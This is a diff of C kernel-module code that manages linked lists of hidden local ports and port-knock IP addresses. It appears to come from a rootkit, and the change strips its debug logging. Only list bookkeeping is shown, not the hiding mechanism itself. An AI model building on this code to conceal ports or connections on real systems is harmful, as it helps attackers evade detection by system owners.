@@ -55,16 +55,13 @@ lport_list_t_ptr hidden_lports_tail = &hidden_lports;
 void
 hide_lport(lport_t lport)
 {
-    if (!list_contains_lport(&hidden_lports, lport)) {
-        DEBUG_INFO("hiding lport %d\n", lport);
+    if (!list_contains_lport(&hidden_lports, lport))
         add_lport_to_list(hidden_lports_tail, lport);
-    }
 }
 
 void
 unhide_lport(lport_t lport)
 {
-    DEBUG_INFO("unhiding lport %d\n", lport);
     remove_lport_from_list(hidden_lports_tail, lport);
 }
 
@@ -104,8 +101,6 @@ clear_hidden_lports(void)
 
     j = hidden_lports_tail;
     while ((j = remove_lport_from_list(j, j->lport)));
-
-    DEBUG_INFO("cleared hidden lports and knocks\n");
 }
 
 bool
@@ -132,8 +127,6 @@ add_lport_to_list(lport_list_t_ptr tail, lport_t lport)
     node = (lport_list_t_ptr)kmalloc(sizeof(lport_list_t), GFP_KERNEL);
 
     if (node) {
-        DEBUG_INFO("adding lport %d to list\n", lport);
-
         node->lport = lport;
         node->next = NULL;
         node->prev = tail;
@@ -151,8 +144,6 @@ remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
     lport_list_t_ptr i = find_lport_in_list(list, lport), ret = NULL;
 
     if (i && (i->lport != -1)) {
-        DEBUG_INFO("removing lport %d from list\n", lport);
-
         if (i->next)
             i->next->prev = i->prev;
         else
@@ -193,8 +184,6 @@ add_knock_to_list(knock_list_t_ptr *tail, ip_t ip, ip_version version)
     node = (knock_list_t_ptr)kmalloc(sizeof(knock_list_t), GFP_KERNEL);
 
     if (node) {
-        DEBUG_INFO("adding knock to list\n");
-
         memcpy(node->ip, ip, (version == v4 ? 4 : 16));
         node->version = version;
         node->next = NULL;
@@ -213,8 +202,6 @@ remove_knock_from_list(knock_list_t_ptr list, knock_list_t_ptr *tail, ip_t ip, i
     knock_list_t_ptr i = find_knock_in_list(list, ip, version), ret = NULL;
 
     if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
-        DEBUG_INFO("removing knock from list\n");
-
         if (i->next)
             i->next->prev = i->prev;
         else
